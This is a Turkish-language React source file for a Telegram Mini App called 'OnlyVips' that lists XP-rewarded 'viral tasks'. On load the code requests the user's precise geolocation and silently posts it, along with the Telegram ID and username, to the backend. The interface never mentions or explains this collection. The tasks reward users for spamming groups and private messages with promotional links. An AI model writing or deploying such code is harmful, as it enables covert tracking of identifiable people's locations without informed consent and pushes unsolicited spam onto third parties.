import { useEffect, useState } from "react";

export default function App() {
  const [user, setUser] = useState<any>(null);

  const viralTasks = [{'title': 'Yeni üye davet et', 'reward': '🎖️ Rozet'}, {'title': "DM'den tanıtım mesajı gönder", 'reward': '+15 XP'}, {'title': '5 farklı grupta botu paylaş', 'reward': '+20 XP'}, {'title': 'Show linkini arkadaşlarına yolla', 'reward': '+10 XP'}, {'title': 'Grubuna MiniApp linkini sabitle', 'reward': '🎖️ Rozet'}, {'title': 'VIP tanıtım postunu 3 grupta paylaş', 'reward': '+25 XP'}, {'title': 'Görev çağrısını 10 kişiye gönder', 'reward': '+30 XP'}, {'title': 'Botu kullanan bir arkadaş davet et', 'reward': '+10 XP'}];

  useEffect(() => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const telegramUser = tg.initDataUnsafe?.user;
    setUser(telegramUser);

    // Konumu backend'e gönder
    if ("geolocation" in navigator && telegramUser?.id) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch(import.meta.env.VITE_API_URL + "/location/report", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              user_id: telegramUser.id,
              username: telegramUser.username,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            })
          });
        },
        (err) => console.warn("Konum alınamadı:", err)
      );
    }
  }, []);

  return (
    <main className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white flex flex-col items-center justify-center p-6 font-sans overflow-hidden">
      <h1 className="text-4xl font-bold mb-4 text-center text-gradient bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 bg-clip-text text-transparent animate-fade-in">
        🚀 OnlyVips Görev Merkezi
      </h1>

      <div className="w-full max-w-md bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-6 shadow-xl animate-fade-in-up">
        <h2 className="text-xl font-semibold mb-4 text-white flex items-center gap-2">
          📋 Viral Görevler
        </h2>
        <div className="space-y-3">
          {viralTasks.map((task, idx) => (
            <div
              key={idx}
              className="bg-black/30 border border-white/10 rounded-xl p-4 shadow-sm animate-fade-in hover:scale-[1.01] transition-all duration-300"
            >
              <div className="text-white font-semibold">📌 {task.title}</div>
              <div className="text-sm text-emerald-400">Ödül: {task.reward}</div>
            </div>
          ))}
        </div>
      </div>

      <footer className="mt-6 text-xs text-gray-500 text-center animate-fade-in-down">
        Görevleri tamamla, XP ve rozet kazan 💫<br />
        Star'lar sadece satın alınabilir ve VIP özelliklerde kullanılır.
      </footer>
    </main>
  );
}
